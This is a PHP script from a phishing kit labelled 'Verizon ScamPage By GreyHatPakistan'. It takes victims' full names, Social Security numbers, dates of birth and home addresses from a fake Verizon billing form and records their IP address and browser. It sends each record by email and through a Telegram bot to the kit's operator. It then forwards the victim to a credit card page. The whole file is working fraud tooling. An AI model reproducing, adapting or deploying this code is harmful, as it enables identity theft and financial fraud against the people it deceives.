<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['fullname'] ) ) {
		
		$_SESSION['fullname'] 	  = $_POST['fullname'];
		$_SESSION['ssn'] 	  = $_POST['ssn'];
		$_SESSION['dob'] 	  = $_POST['dob'];
		$_SESSION['stadd'] 	  = $_POST['stadd'];
		$_SESSION['city'] 	  = $_POST['city'];
		$_SESSION['state'] 	  = $_POST['state'];
		$_SESSION['zip'] 	  = $_POST['zip'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 Verizon Billing ⚫️🌀 ]★　————-««
[Full Name] 		: {$_SESSION['fullname']}
[SSN] 		: {$_SESSION['ssn']}
[Date of Birth]		: {$_SESSION['dob']}
[Street Address] 		: {$_SESSION['stadd']}
[City]		: {$_SESSION['city']}
[State]		: {$_SESSION['state']}
[Zip] 		: {$_SESSION['zip']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 Verizon ScamPage By GreyHatPakistan ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
		if ($sendtoemail=="yes"){
		$subject = "🏛️ Verizon Billing By GreyHatPakistan🏛️  From $ip";
        $headers = "From: 🍁Greyhatpakistan🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}


        header("Location: ../Credit Card.php");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}


?>